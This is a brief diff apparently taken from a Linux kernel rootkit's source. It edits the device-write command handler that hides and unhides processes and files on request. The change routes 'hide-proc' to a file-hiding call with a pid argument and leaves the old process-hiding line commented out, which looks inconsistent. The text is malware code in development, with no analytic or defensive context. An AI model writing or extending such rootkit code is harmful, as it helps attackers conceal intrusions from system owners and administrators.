@@ -123,8 +123,12 @@ static ssize_t dev_write(struct file* filep, const char* buffer, size_t len, lof
 		cursor++;
 	}
 
-	if(strcmp(command, "hide-proc") == 0 || strcmp(command, "unhide-proc") == 0)
-		hide_proc(katoi(storage));
+	if(strcmp(command, "hide-proc") == 0) {
+		hide_file(pid);
+		//hide_proc(katoi(storage));
+	}
+	else if (strcmp(command, "unhide-proc") == 0)
+		unhide_file_all();
 	else if (strcmp(command, "hide-file") == 0)
 		hide_file(filePath);
 	else if (strcmp(command, "unhide-file") == 0)
